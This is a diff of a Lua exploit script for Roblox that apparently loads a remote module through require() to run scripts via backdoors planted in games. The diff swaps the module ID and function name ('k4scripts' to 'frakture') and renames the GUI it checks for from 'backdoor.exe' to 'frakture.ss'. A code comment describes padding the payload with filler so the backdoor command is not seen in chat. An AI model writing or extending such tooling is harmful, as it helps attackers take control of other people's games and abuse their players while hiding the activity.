@@ -28,7 +28,7 @@ local JointsService = game:GetService("JointsService")
 local StarterGui = game:GetService("StarterGui")
 
 local LocalPlayer = game:GetService("Players").LocalPlayer
-local requireScript = ("require(8530655817).k4scripts('%s', %s) -- "):format(LocalPlayer.Name, "true", string.rep("!", 2400)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
+local requireScript = ("require(8913865946).frakture('%s', %s) -- "):format(LocalPlayer.Name, "true", string.rep("!", 2400)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
 local invCode = "w8SkzPz9qQ"
 
 local alternativeSS = {
@@ -56,12 +56,12 @@ local function attached(possibleWait)
 	if possibleWait then
 		local start = dateTimeNow().UnixTimestampMillis
 		local possibleWait = possibleWait * 1000
-		while PlayerGui and not PlayerGui:FindFirstChild("backdoor.exe") and (possibleWait > dateTimeNow().UnixTimestampMillis - start) do
+		while PlayerGui and not PlayerGui:FindFirstChild("frakture.ss") and (possibleWait > dateTimeNow().UnixTimestampMillis - start) do
 			taskWait()
 		end
 	end
 
-	return PlayerGui and PlayerGui:FindFirstChild("backdoor.exe")
+	return PlayerGui and PlayerGui:FindFirstChild("frakture.ss")
 end
 
 local function validRemote(rm)
